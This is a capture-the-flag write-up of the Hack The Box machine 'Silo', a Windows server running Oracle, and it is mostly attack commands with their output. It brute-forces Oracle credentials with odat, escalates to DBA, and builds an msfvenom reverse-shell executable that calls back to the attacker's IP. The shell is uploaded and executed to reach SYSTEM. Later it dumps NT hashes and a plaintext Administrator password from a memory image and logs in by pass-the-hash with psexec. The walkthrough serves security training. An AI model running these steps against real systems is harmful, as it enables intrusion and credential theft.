# Hackthebox Silo

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.95.188
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 14:03 EST
Nmap scan report for 10.129.95.188
Host is up (0.036s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-06T19:05:51
|_  start_date: 2022-01-06T19:02:45
```

Gobuster

```
$ gobuster dir -u http://10.129.95.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.188
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
2022/01/06 14:04:31 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*checkout*.aspx      (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*docroot*.aspx       (Status: 400) [Size: 3420]
/*.aspx               (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420] 
/http%3A.aspx         (Status: 400) [Size: 3420] 
/q%26a                (Status: 400) [Size: 3420] 
/q%26a.aspx           (Status: 400) [Size: 3420] 
/**http%3a.aspx       (Status: 400) [Size: 3420] 
/**http%3a            (Status: 400) [Size: 3420] 
/*http%3A             (Status: 400) [Size: 3420] 
/*http%3A.aspx        (Status: 400) [Size: 3420] 
/**http%3A.aspx       (Status: 400) [Size: 3420] 
/**http%3A            (Status: 400) [Size: 3420] 
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420] 
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]     
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 3420]  
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]     
/http%3A%2F%2Fblog.aspx (Status: 400) [Size: 3420]   
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]     
/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 3420]  
/s%26p                (Status: 400) [Size: 3420]     
/s%26p.aspx           (Status: 400) [Size: 3420]     
/%3FRID%3D2671        (Status: 400) [Size: 3420]     
/%3FRID%3D2671.aspx   (Status: 400) [Size: 3420]     
/devinmoore*          (Status: 400) [Size: 3420]     
/devinmoore*.aspx     (Status: 400) [Size: 3420]     
/200109*              (Status: 400) [Size: 3420]     
/200109*.aspx         (Status: 400) [Size: 3420]     
/*sa_                 (Status: 400) [Size: 3420]     
/*dc_                 (Status: 400) [Size: 3420]     
/*sa_.aspx            (Status: 400) [Size: 3420]     
/*dc_.aspx            (Status: 400) [Size: 3420]     
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]   
/http%3A%2F%2Fcommunity.aspx (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct.aspx (Status: 400) [Size: 3420]           
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29.aspx (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]                     
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt.aspx (Status: 400) [Size: 3420]                   
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]                        
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]                                                                
/http%3A%2F%2Fradar.aspx (Status: 400) [Size: 3420]                                                             
/q%26a2               (Status: 400) [Size: 3420]                                                                
/q%26a2.aspx          (Status: 400) [Size: 3420]                                                                
/login%3f             (Status: 400) [Size: 3420]                                                                
/login%3f.aspx        (Status: 400) [Size: 3420]                                                                
/Shakira%20Oral%20Fixation%201%20%26%202.aspx (Status: 400) [Size: 3420]                                        
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]                                             
/%22james%20kim%22.aspx (Status: 500) [Size: 3420]                                                              
/%22julie%20roehm%22.aspx (Status: 500) [Size: 3420]                                                            
/%22britney%20spears%22.aspx (Status: 500) [Size: 3420]                                                         
/http%3A%2F%2Fjeremiahgrossman.aspx (Status: 400) [Size: 3420]                                                  
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]                                                       
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]                                                                
/http%3A%2F%2Fweblog.aspx (Status: 400) [Size: 3420]                                                            
/http%3A%2F%2Fswik.aspx (Status: 400) [Size: 3420]                                                              
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]                                                                
                                                                                                                
===============================================================
2022/01/06 15:00:11 Finished
===============================================================
```

```
$ gobuster dir -u http://10.129.95.188 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x asp,aspx,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.188
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
2022/01/06 15:10:30 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.129.95.188/aspnet_client/]
/render/https://www.google.com.aspx (Status: 400) [Size: 3420]                           
                                                                                         
===============================================================
2022/01/06 15:11:42 Finished
===============================================================
```



## Vulnerability Scanning

### smb

The scripts won't reveal info and logins without username and password won't succeed.

### RPC

Connecting rpcclient without password does not work

```
$ rpcclient -U "" 10.129.95.188                                                                                                                                 1 ⨯
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### Oracle TNS listener

```
$ odat sidguesser -s 10.129.95.188

[1] (10.129.95.188:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID. Continue...                                   ############################################################################  | ETA:  00:00:00 
[+] 'XEXDB' is a valid SID. Continue...                                
100% |###############################################################################################################################################| Time: 00:00:56 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
100% |###############################################################################################################################################| Time: 00:00:01 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid SID. Continue...                                   ##############################################################                | ETA:  00:00:05 
100% |###############################################################################################################################################| Time: 00:00:50 
[+] SIDs found on the 10.129.95.188:1521 server: XE,XEXDB
```

Bruteforce access credentials

```
$ sudo odat passwordguesser -s 10.129.95.188 -d XE  
k
[1] (10.129.95.188:1521): Searching valid accounts on the 10.129.95.188 server, port 1521
The login cis has already been tested at least once. What do you want to do:                                                                         | ETA:  00:02:58 
[+] Valid credentials found: scott/tiger. Continue...                  #################################################                             | ETA:  00:00:49 
100% |###############################################################################################################################################| Time: 00:03:58 
[+] Accounts found on 10.129.95.188:1521/XE: 
scott/tiger
```

Check if we have dba privileges, and also confirm there are lots of ways to exploit the database

```
$ sudo odat privesc -s 10.129.95.188 -d XE -U scott -P tiger --sysdba  --get-privs > odat.out
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Silo]
└─$ grep -i exploitable odat.out 
- system privege: ANALYZE ANY	 <-- exploitable
- system privege: CREATE ANY INDEX	 <-- exploitable
- system privege: CREATE ANY PROCEDURE	 <-- exploitable
- system privege: CREATE ANY TRIGGER	 <-- exploitable
	...
```

We can also get an sql shell

```
$ sudo odat search  -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --sql-shell

[1] (10.129.95.188:1521): Starting an interactive SQL shell
Ctrl-D to close the SQL shell
SQL>
```

And testing commands we can grant dba role for our user using

```
$ sudo odat privesc  -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --dba-with-execute-any-procedure

[1] (10.129.95.188:1521): Grant DBA role to current user with CREATE/EXECUTE ANY PROCEDURE method
[+] The DBA role has been granted to this current user
```


## Initial Access

Create a reverse shell executable

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=6666 -f exe > shell.exe                                                                         2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Upload it to the target host

```
 sudo odat utlfile  -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --putFile /temp shell.exe /home/kali/Documents/CTF/hackthebox/Silo/shell.exe

[1] (10.129.95.188:1521): Put the /home/kali/Documents/CTF/hackthebox/Silo/shell.exe local file in the /temp folder like shell.exe on the 10.129.95.188 server
[+] The /home/kali/Documents/CTF/hackthebox/Silo/shell.exe file was created on the /temp directory on the 10.129.95.188 server like the shell.exe file
```

Execute the file after we have launched our listener

```
$ sudo odat externaltable  -s 10.129.95.188 -d XE -U scott -P tiger --sysdba --exec /temp shell.exe 

[1] (10.129.95.188:1521): Execute the shell.exe command stored in the /temp path
```

And we have a shell

```
$ nc -nvlp 6666                                    
listening on [any] 6666 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.95.188] 49166
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
nt authority\system
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>dir c:\users\Phineas\Desktop\user.txt
dir c:\users\Phineas\Desktop\user.txt
 Volume in drive C has no label.
 Volume Serial Number is 69B2-6341

 Directory of c:\users\Phineas\Desktop

01/07/2022  12:14 PM                34 user.txt
               1 File(s)             34 bytes
               0 Dir(s)   7,395,725,312 bytes free
```

Since we have root privileges we can also straight away fetch the root flag

```
c:\Users\Administrator\Desktop>type root.txt
type root.txt
3f918741...

c:\Users\Administrator\Desktop>
```

## Privilege Escalation

There is another way to escalate privileges in case the reverse shell would not have been root already.

Start by looking around in the user directories, and we bump to an interesting file.

```
c:\Users\Phineas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 69B2-6341

 Directory of c:\Users\Phineas\Desktop

01/07/2018  02:03 PM    <DIR>          .
01/07/2018  02:03 PM    <DIR>          ..
01/05/2018  10:56 PM               300 Oracle issue.txt
01/07/2022  12:14 PM                34 user.txt
               2 File(s)            334 bytes
               2 Dir(s)   7,395,725,312 bytes free

c:\Users\Phineas\Desktop>type "Oracle issue.txt"
type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
�%Hm8646uC$
```

Now the challenge is that the password encoding looks weird. Using page https://string-functions.com/encodedecode.aspx and encoding the text from iso-8859-1 to utf-8 changes the first letter to ´?´. However, that is incorrect as well. Copying the file back to our attacking machine and opening it in vi provides the right results. Not even cat works.

```
£%Hm8646uC$
```

Downloading the file gives us a huge memory dump file.

First install volatility3

```
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python3 setup.py install
```

From the memdump we can extract all kinds of interesting information, begin with the OS info

```
$ ./vol.py  -f ../memdump/SILO-20180105-221806.dmp windows.info.Info                                                                                                                2 ⨯
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                                                                                              
Variable	Value

Kernel Base	0xf8007828a000
DTB	0x1a7000
Symbols	file:///home/kali/Documents/CTF/hackthebox/Silo/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/A9BBA3C139724A738BE17665DB4393CA-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 WindowsCrashDump64Layer
base_layer	2 FileLayer
KdVersionBlock	0xf80078520d90
Major/Minor	15.9600
MachineType	34404
KeNumberProcessors	2
SystemTime	2018-01-05 22:18:07
NtSystemRoot	C:\Windows
NtProductType	NtProductServer
NtMajorVersion	6
NtMinorVersion	3
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	3
PE Machine	34404
PE TimeDateStamp	Thu Aug 22 08:52:38 2013
```

And of course the hashdump

```
$ ./vol.py  -f ../memdump/SILO-20180105-221806.dmp windows.hashdump.Hashdump
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                                
User	rid	lmhash	nthash

Administrator	500	aad3b435b51404eeaad3b435b51404ee	9e730375b7cbcebf74ae46481e07b0c7
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
Phineas	1002	aad3b435b51404eeaad3b435b51404ee	8eacdd67b77749e65d3b3d5c110b0969
```

And the lsadump tells us the plaintext password of the Administrator

```
$ ./vol.py  -f ../memdump/SILO-20180105-221806.dmp windows.lsadump.Lsadump
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                                
Key	Secret	Hex

DefaultPassword	DoNotH@ckMeBro!	1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 44 00 6f 00 4e 00 6f 00 74 00 48 00 40 00 63 00 6b 00 4d 00 65 00 42 00 72 00 6f 00 21 00 00 00
DPAPI_SYSTEM	,Ï%14¬ò§tmC¨¦©Bb÷UpH»}þyI½	2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 cf 25 94 31 34 9e ae 43 2d 8b 87 ac f2 a7 74 1c 6d ec 1c 04 08 43 a8 a6 a9 42 62 f7 55 70 48 bb 17 7d 82 fe 79 49 02 bd 00 00 00 00
```

We can also just pass the hash for psexec.py and get a login

```
$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 silo/Administrator@10.129.95.188   
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.95.188.....
[*] Found writable share ADMIN$
[*] Uploading file FTEfQyng.exe
[*] Opening SVCManager on 10.129.95.188.....
[*] Creating service uZbp on 10.129.95.188.....
[*] Starting service uZbp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


